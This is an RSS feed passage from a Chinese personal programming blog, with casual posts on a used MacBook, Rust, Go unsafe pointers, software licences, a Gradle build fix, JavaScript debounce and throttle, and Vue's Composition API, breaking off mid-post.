<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SDTTTTT</title><link>https://sdttttt.github.io/</link><description>Recent content on SDTTTTT</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Thu, 10 Jun 2021 15:38:03 +0800</lastBuildDate><atom:link href="https://sdttttt.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>New PC</title><link>https://sdttttt.github.io/blog/about-mbp/</link><pubDate>Thu, 10 Jun 2021 15:38:03 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/about-mbp/</guid><description>
&lt;p>最近入手了一台二手的 16 款 MBP. 配置是 i7-6700|16G|视网膜屏幕|512G 价格是 7000&lt;/p>
&lt;p>购买的时候是周四，第二周的星期一到的。
总结来说这台机器的情况比我想得要好，外壳上有一些使用痕迹，这挺正常，机器屏幕和键盘都是完好的，硬件也没有缺陷，驱动都可以正常使用。&lt;/p>
&lt;p>还有充电循环只有 1 次，也就是基本是 99 新的机器。
真tm是捡到宝了。&lt;/p>
&lt;p>虽然这玩意是16年的机器，不过使用X OS 10.15.7版本还是很流畅的。最新的Big Sur就不升级了，感觉会被负优化。&lt;/p>
&lt;p>唯一比较有遗憾的就是MBP发热都是这么严重的么。打开网页看一会视频，键盘面的额头就开始发烫，摸上去感觉有60度了。&lt;/p>
&lt;p>这个散热真的大丈夫？&lt;/p>
&lt;p>最后说说感想吧，头一次用苹果的产品，整个笔记本无论是硬件还是软件的设计只能用一个词来形容： 性感。&lt;/p></description></item><item><title>宏</title><link>https://sdttttt.github.io/blog/hong/</link><pubDate>Fri, 23 Apr 2021 16:18:21 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/hong/</guid><description>
&lt;p>前几天在B乎上看到一个问题&amp;hellip;《java有没有宏？》&lt;/p>
&lt;p>这&amp;hellip;我想了半天，这种语法规则问题基本百度就能找到，这&amp;hellip;&lt;/p>
&lt;p>java作为解释型语言宏肯定是没有的&amp;hellip;这里稍微说一下宏这个东西的作用吧。&lt;/p>
&lt;p>C/C++等编译型语言一般为了跨平台编译的方便性，肯定会在一些无法跨平台的代码中编写宏，宏会在编译期展开不会影响程序在执行时的性能。&lt;/p>
&lt;p>宏具体会怎么展开就要看展开的条件了，比如只有类UNIX才能用的宏，或者配合环境变量展开的宏。还有一些能节省代码的宏。&lt;/p>
&lt;blockquote>
&lt;p>Rust的宏非常变态，你甚至可以用Rust的宏自定义一门编程语言&amp;hellip;&lt;/p>
&lt;/blockquote>
&lt;p>解释型语言基本上屏蔽了不同平台之间的细节，而且没有编译期，也就不需要宏这种东西了。&lt;/p></description></item><item><title>Free Software</title><link>https://sdttttt.github.io/blog/free-software/</link><pubDate>Fri, 16 Apr 2021 11:26:17 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/free-software/</guid><description>
&lt;p>最近把我所有在github上软件的许可证换成了&lt;code>The Unlicense&lt;/code>. 为啥呢..
这个就不得不说一下关于理查德·马修·斯托曼的一个故事..&lt;/p>
&lt;p>理查德·马修·斯托曼可以说是GNU的领袖. 别和我说你不知道GNU是什么.. 如果你不知道也不用去查, 等会会讲到..
上世纪80年代, 黑客文化被资本主义侵蚀, 诞生了很多专利软件, 在黑客社区里有相当一部分的人都流失了, 应该说是被挖走了.&lt;/p>
&lt;blockquote>
&lt;p>这个黑客的意思是计算机技术专家,狂热爱好者.&lt;/p>
&lt;/blockquote>
&lt;p>斯托曼为了抗衡专利软件, 就创建了GNU计划. GNU在百科上也能看到, 是一套兼容于UNIX的操作系统.
内部包含了所有GNU的一系列自由软件.&lt;/p>
&lt;p>这里就不得不提GPL这个协议了, 这个协议可以说是一个自由软件的极端. 用简单的话来说就是 &lt;strong>强制开源&lt;/strong>, 用了GPL协议软件的源代码, 你后续发布也必须是开源的, 就是一种强制的分享精神.&lt;/p>
&lt;p>我之前使用的是MIT协议, 它没有以上的限制, 你可以选择闭源. 但是需要保持原作者版权.&lt;/p>
&lt;p>事实上.. 我根本不需要版权这个东西, 只要用我的代码,出了事别把责任推给我就行. 所以我最后选择了 &lt;code>The Unlicense&lt;/code>这个协议, 这个协议只有一条免责.其他完全不管, 有点爽.&lt;/p></description></item><item><title>About Rust</title><link>https://sdttttt.github.io/blog/about-rust/</link><pubDate>Fri, 09 Apr 2021 17:09:19 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/about-rust/</guid><description>
&lt;p>Rust这个语言是我大概去年年中学的, 虽然一只在用, 都没评价这个语言, 这次有点空可以稍微说一下..&lt;/p>
&lt;p>有些人觉得Rust很难, 确实, 我不反驳, 但是也就起步比较难.&lt;/p>
&lt;p>编程范式比起C++/JAVA入门就多出一大截, 一大堆概念往脑子里灌, 所有权, 智能指针等之类的. 还有一堆花里胡哨的语法.&lt;/p>
&lt;p>但是习惯之后, 基本就能体会到写Rust的快乐了, 有一个非常严厉的编译器~~(抖M锤石)~~, 能提供非常友善的编译错误和TUI提示, 还有一整套,
好用到爆炸的工具链, 但是测试覆盖还不太行.&lt;/p>
&lt;p>由于是系统级语言, 性能至少肯定比Java这种解释性强, 所以基本不怕你把性能写的稀烂.
内存泄漏不存在的, 编译器会鞭策你. 支持平台也很多, 不怕你搞嵌入式, 写法很罗嗦? 事实上Rust里有很多的语法糖, 基本不会写的很多.&lt;/p></description></item><item><title>Go Unsafe</title><link>https://sdttttt.github.io/blog/go-unsafe/</link><pubDate>Thu, 08 Apr 2021 17:26:07 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/go-unsafe/</guid><description>
&lt;p>看了一些关于unsafe包的文章,长话短说:&lt;/p>
&lt;p>unsafe.Pointer就是一个纯指针, 它很聪明, 如果对象改变了地址它也会自动改变.并且保持对对象的引用, 这样对象不会被回收.&lt;/p>
&lt;p>uintptr就是一个比较大的整型, 能容下任何指针地址, 但是这个不会跟随对象改变地址&amp;hellip;而且对象还会被回收&amp;hellip;&lt;/p></description></item><item><title>Log 20</title><link>https://sdttttt.github.io/blog/log-20/</link><pubDate>Thu, 08 Apr 2021 14:22:05 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/log-20/</guid><description>
&lt;p>最近写了一个新的数据收集的服务器软件, 我叫他Huck, 为啥呢&amp;hellip;
我很喜欢一部叫传颂之物的番, 可惜为男主配音的声优以及去世了, 导致续作换了声优.&lt;/p>
&lt;p>前几天刚刚看到换声优的消息就很难受, 我还挺喜欢为哈克培养的启叔, 可惜锕&amp;hellip; 所以取了这个名字纪念一下.&lt;/p>
&lt;hr>
&lt;p>最近也开始忙起来了, 希望下个月好一点.&lt;/p></description></item><item><title>Log 19</title><link>https://sdttttt.github.io/blog/log-19/</link><pubDate>Fri, 26 Mar 2021 10:02:59 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/log-19/</guid><description/></item><item><title>Log 18</title><link>https://sdttttt.github.io/blog/log-18/</link><pubDate>Wed, 24 Mar 2021 16:33:21 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/log-18/</guid><description>
&lt;p>最近有好消息和坏消息：&lt;/p>
&lt;p>坏消息就是工作地点改了，现在每天早上都要做1小时地铁才能到公司，啊啊啊，好想换成里家里近一点的地方锕&amp;hellip;还有就是上班时间还tm提早了，我tm&amp;hellip;&lt;/p>
&lt;p>好消息就是原来工作的地点太挤了，这次终于有了独立的办公桌，有点爽，最近也开始富起来了，该给家里的电脑换外设了。&lt;/p></description></item><item><title>Log 17</title><link>https://sdttttt.github.io/blog/log-17/</link><pubDate>Mon, 22 Mar 2021 11:16:33 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/log-17/</guid><description>
&lt;p>最近工作虽然忙，但是强摸还是能摸出一些时间来，GRC又有了新的需求，要增加GPG的提交签名。&lt;/p>
&lt;p>一开始我以为很简单，因为看起来我原本使用的&lt;code>git2-rs&lt;/code>这个库提供了签名的实现，有一个&lt;code>commit_sign&lt;/code>方法。&lt;/p>
&lt;p>实际这个方法里面没有实现签名的生成，没办法只好去开源社区里找找了，issue里有有好心人提供了链接，我大概看了看，&lt;/p>
&lt;p>最后把目光转向到了&lt;code>gpgme&lt;/code>这个库上，但是这个玩意是一个对FFI的包装库，并不是原生实现，编译的时候需要依赖一些C/C++的链接库。我佛了。&lt;/p>
&lt;p>这就意味这在Windows上的运行会出现麻烦。后来又找了别的库，但是都很底层，API文档看的我一脸愣逼。
这个问题，还真的得拖一段时间。&lt;/p>
&lt;p>希望有带佬能搞一个Rust原生又方便的GPG签名库. 如果实在没有，我亲自上也不是不行&amp;hellip;emmmm (逃)&lt;/p></description></item><item><title>Log 16</title><link>https://sdttttt.github.io/blog/log-16/</link><pubDate>Tue, 16 Mar 2021 16:52:51 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/log-16/</guid><description>
&lt;p>给Blog换个一个配色, 之前的配色太原生HTML, 丑的我都有点看不下去了&amp;hellip;&lt;/p>
&lt;p>新的主题是themes.gohugo.io上随便挑的, 看顺眼就用上了. 讲的就是眼缘.Emm..&lt;/p>
&lt;p>其实我还是比较喜欢纯色的主题. 有&lt;code>MACOS&lt;/code>感觉的那种emm..&lt;/p></description></item><item><title>Log 15</title><link>https://sdttttt.github.io/blog/log-15/</link><pubDate>Thu, 04 Mar 2021 16:58:54 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/log-15/</guid><description>
&lt;p>好tm忙, 但是又好tm无聊.&lt;/p></description></item><item><title>Log 14</title><link>https://sdttttt.github.io/blog/log-14/</link><pubDate>Tue, 02 Mar 2021 10:36:48 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/log-14/</guid><description>
&lt;p>最近不想让服务器多余的资源吃灰, 就在服务器上做了种, 提供一些下载资源的速度.
不过带宽确实是太小了, 这个玩意总共就1m带宽, 如果边做种我再边用RSS的话,
这个速度我都怀疑这玩意是不是done了?&lt;/p>
&lt;p>所以平时白天做种的速度只能限制再&lt;code>100KB/s&lt;/code>以下, 不如RSS的速度真的太感人.
晚上的话, 龟速模式就会解除, 做种速度能提升大概3-4倍的样子.&lt;/p>
&lt;p>如果有机会还是想白嫖带宽大一点的服务器锕.&lt;/p></description></item><item><title>RSS 好耶!</title><link>https://sdttttt.github.io/blog/new-rss/</link><pubDate>Sat, 20 Feb 2021 11:13:45 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/new-rss/</guid><description>
&lt;p>最近迷上了RSS这种获取信息的方式, 平时访问多个网站来获取信息的方式实属低效率, 而且太碎了, 俺这种老年人就经常忘记.&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>RSS:&lt;/strong> 简易信息聚合（也叫聚合内容）是一种基于XML标准，在互联网上被广泛采用的内容包装和投递协议。RSS(Really Simple Syndication)是一种描述和同步网站内容的格式，是使用最广泛的XML应用。RSS搭建了信息迅速传播的一个技术平台，使得每个人都成为潜在的信息提供者。发布一个RSS文件后，这个RSS Feed中包含的信息就能直接被其他站点调用，而且由于这些数据都是标准的XML格式，所以也能在其他的终端和服务中使用，是一种描述和同步网站内容的格式。&lt;/p>
&lt;/blockquote>
&lt;p>目前使用RSS有一个很阴霸的东西, 叫做&lt;code>RSSHub&lt;/code>, 这个玩意能很好解决你找RSS订阅的麻烦.&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>RSSHub&lt;/strong> 是一个开源、简单易用、易于扩展的 RSS 生成器，可以给任何奇奇怪怪的内容生成 RSS 订阅源。RSSHub 借助于开源社区的力量快速发展中，目前已适配数百家网站的上千项内容.&lt;/p>
&lt;/blockquote>
&lt;p>不过这玩意是一个服务器软件, 需要单独部署的. 官方提供的demo有很大一部分的&lt;code>RSS Feed&lt;/code>都是无效的. 这两天正好自建了一个&lt;code>RSSHub&lt;/code>, 在&lt;a href="http://118.25.6.84/">这里&lt;/a>.&lt;/p>
&lt;p>如果有需要可以使用这个地址来代替官方提供的demo. 至少一年内都不会失效🐶&lt;/p>
&lt;blockquote>
&lt;p>小声BB: 实际上我的blog也是有rss的, 你能找到么?&lt;/p>
&lt;/blockquote></description></item><item><title>记录一次Gradle构建的困难</title><link>https://sdttttt.github.io/blog/gradle-build-for-idiotc4t/</link><pubDate>Fri, 05 Feb 2021 10:57:31 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/gradle-build-for-idiotc4t/</guid><description>
&lt;p>受@idiotc4t所托, 我拿到了一个Java项目, 目的是要把这玩意编译出来, 最初我还以为和以前的Java项目类似,
只要&lt;code>mvn build&lt;/code> 就能一了百了, 没想到这次拿到的是一个使用gradle构建的项目.&lt;/p>
&lt;blockquote>
&lt;p>gradle的出现比maven晚, 它们都是用来构建运行在JVM上的应用使用的, gradle可以使用编程语言来自定义你的构建流程, 类似C的makefile(这个比喻不太好其实), 或者是JavaScript的gulp. gradle解决了maven的一些特点, 比如xml的配置繁琐, 看着就头大, 以及构建步骤的灵活控制. 总之很牛逼就是了, 也比较难上手.&lt;/p>
&lt;/blockquote>
&lt;p>由于我以前使用过一段时间的gradle, 所以我知道用gradle打jar包的困难. (gradle这个工具通常都是给Android开发者用的, 默认没有提供打成Jar包的选项, 所以打出来什么包, 得看缘分.)&lt;/p>
&lt;p>当我运行&lt;code>gradle build&lt;/code>后, &lt;strong>光速&lt;/strong>构建完成, 我定神一看, 没有工程文件目录, 倒是有一个jar包 ,这个jar包就14KB, 好家伙, 肯定没构建成功. (正常的java程序绝对不会这么小, 一般肯定是1MB以上) 输入&lt;code>java -jar&lt;/code>一看, 果然:&lt;/p>
&lt;pre>&lt;code>...jar: 没有主清单属性
&lt;/code>&lt;/pre>&lt;p>总之我在网上查了半天都没发现解决方法. 最后把目光转向代码, 最后发现在代码中都没有声明包路径&amp;hellip;&lt;/p>
&lt;blockquote>
&lt;p>(嘶&amp;hellip;.这厮在README里是怎么打包的???我怀疑有这B留了一手)&lt;/p>
&lt;/blockquote>
&lt;p>最后用宇宙第一IDE(IDEA)重构了整个包的代码, 补上了包路径. 再次尝试&lt;code>gradle build&lt;/code>,终于看到了工程文件.&lt;/p>
&lt;p>总之, 还好老子技高一筹.&lt;/p>
&lt;p>写完了, 摸了.&lt;/p></description></item><item><title>节流与防抖</title><link>https://sdttttt.github.io/blog/js-1/</link><pubDate>Mon, 18 Jan 2021 16:49:35 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/js-1/</guid><description>
&lt;p>闲来无事在网上翻一些关于 Javascript 的一些搞基技巧，就发现了节流与防抖这两种设计模式。&lt;/p>
&lt;p>上个星期在编写搜索框的时候就已经写过类似的代码 &lt;em>（搜索框输入关键词会实时去服务器上搜索，考虑到服务器压力就把代码加了限制，每 500ms 最多搜索一次，实际上这就是类似防抖的设计，只是我还不知道这个叫防抖&amp;hellip;）&lt;/em>&lt;/p>
&lt;p>下面是搜索框的限制代码：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="nx">watch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">searchText&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">newVal&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">clearTimeout&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">searchTimer&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">searchTimer&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">setTimeout&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="p">()&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="c1">//...需要限制的逻辑
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">),&lt;/span>
&lt;span class="mi">500&lt;/span>
&lt;span class="p">);&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>原理非常简单，通过定时器实现，一旦现有状态改变就说明有新的输入，然后清除老的定时器，新设置定时器。&lt;/p>
&lt;hr>
&lt;p>今天在网上冲浪又学到了一种新的设计：&lt;strong>节流&lt;/strong>&lt;/p>
&lt;p>直接看代码吧：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="nx">watch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">searchText&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">newVal&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">isStop&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">isStop&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">setTimeout&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="p">()&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">//...需要限制的逻辑
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">isStop&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">false&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">),&lt;/span>
&lt;span class="mi">500&lt;/span>
&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>emmm，一开始看了半天，实际上看懂之后节流比防抖更加简单 &lt;em>（好吧，看了几遍其实发现差不多）&lt;/em>&lt;/p>
&lt;p>原理还是一样简单，计数器结束将标志位设置为 false，这样新来的计时器就能通过，如果没到限制时间就进入这个函数会被标志位拦住，直接返回。&lt;/p>
&lt;p>节流主要作用就是限制执行频率。&lt;/p>
&lt;p>硬要说防抖和节流的区别。。。emm我也说不上来，看应用场景吧。&lt;/p></description></item><item><title>Composition Api</title><link>https://sdttttt.github.io/blog/composition-api/</link><pubDate>Thu, 14 Jan 2021 10:29:36 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/composition-api/</guid><description>
&lt;p>最近一直在写 Vue, 在公司的项目里使用的是&lt;code>Composition Api&lt;/code> + Vue2 的组合. &lt;em>(因为公司里考虑到同事的技能树, 没有用vue3和Typescipt)&lt;/em>.&lt;/p>
&lt;p>CA 是 Vue3 追加的全新 API. 用到 Vue2 里可能有点怪怪的.&lt;/p>
&lt;p>不过 CA 是以 Vue-Plugin 的方式提供的 API, 所以使用起来非常方便.
同时也鼓励更多人使用这个API.&lt;/p>
&lt;p>首先是关于这个API的使用方式, 以前的代码需要将方法卸载method区块中, 每个变量和方法之间的关系很模糊暧昧.&lt;br>
需要开发者自己去找关于每个方法和变量之间的关系, 用CA之后可以写出类似ReactHook风格的代码.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-typescript" data-lang="typescript">&lt;span class="c1">// OA (Option API 原版的API是这样称呼的)
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">data&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">count&lt;/span>: &lt;span class="kt">1&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="nx">methods&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">sub&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">num&lt;/span>: &lt;span class="kt">number&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// ...
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">},&lt;/span>
&lt;span class="nx">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">num&lt;/span>: &lt;span class="kt">number&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// ...
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// CA
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="nx">count&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">ref&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nx">add&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">sub&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">useCount&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">sub&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">useCount&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">count&lt;/span>: &lt;span class="kt">Ref&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">number&lt;/span>&lt;span class="p">&amp;gt;)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">sub&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">num&lt;/span>: &lt;span class="kt">number&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// ...
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">},&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">num&lt;/span>: &lt;span class="kt">number&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// ...
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 当然你也可以像ReactHook那样写， 完全没有问题，看你的个人口味
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nx">count&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">add&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">sub&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">useCount&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">sub&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">useCount&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">count&lt;/span>: &lt;span class="kt">number&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">count&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">ref&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">count&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">sub&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">num&lt;/span>: &lt;span class="kt">number&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// ...
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">},&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">num&lt;/span>: &lt;span class="kt">number&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// ...
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>我目前写CA大概就是这样编写的. 根据一个响应数据的关系编写改变它的一系列动作.
这样逻辑拆分的很清楚. 查看起来也比较方便.&lt;/p>
&lt;hr>
&lt;p>不过这套API目前的缺点也比较明显, 在开发过程中从Vue2过来的用户很明显能感觉到,
在&lt;code>setup()&lt;/code>由于不能使用&lt;code>this&lt;/code>所以会有很多开发习惯上的麻烦.&lt;/p>
&lt;p>&lt;strong>这里说个关于使用this上挂载对象的方法.&lt;/strong> (ctx参数不说了)&lt;/p>
&lt;ul>
&lt;li>
&lt;p>首先就是CA的库中有一个函数,叫做&lt;code>getCurrentInstall&lt;/code>. 可以通过该函数获得当前组件的实例. 使用该实例上代理的对象就能控制各种&lt;code>this.$router&lt;/code>, &lt;code>this.$refs&lt;/code>方法了.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>第二种可以让你使用&lt;code>this&lt;/code>, 把动作函数挂载到某个视图按钮上的时候, 在该动作函数里就可以使用&lt;code>this&lt;/code>对象. 上面有正常OA可以使用的所有&lt;code>this&lt;/code>上挂载的对象.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>开发项目的时候还踩了很多坑, 不过都是一些智商问题&amp;hellip; 比如JS的对象传递传递的是&lt;code>Reference&lt;/code>, 基本类型是&lt;code>Clone&lt;/code>. 因为这个原因有几个视图之间的数据没法实时同步, 害我浪费了一个下午.&lt;/p>
&lt;h3 id="关于-watcheffect">关于 watchEffect&lt;/h3>
&lt;p>这个函数的实现和React Hook中的useEffect有异曲同工之妙,
